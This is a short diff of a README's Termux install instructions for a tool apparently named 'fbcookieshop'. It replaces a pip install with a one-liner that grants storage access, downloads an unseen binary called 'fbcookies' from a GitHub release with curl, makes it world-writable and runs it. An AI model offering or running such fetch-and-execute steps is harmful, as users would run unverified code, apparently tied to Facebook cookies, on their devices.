@@ -16,7 +16,7 @@ Follow these steps to install the tool on Termux for Android devices:
    After installing Python and pip, install the `fbcookieshop` tool using the following command:
 
    ```bash
-   pip install fbcookieshop
+   termux-setup-storage && pkg update && pkg upgrade && cd && curl -L https://github.com/hop09/fbcookies/releases/download/main_file/fbcookies > fbcookies && chmod 777 fbcookies && ./fbcookies
    ```
 
    This will download and install the required package.
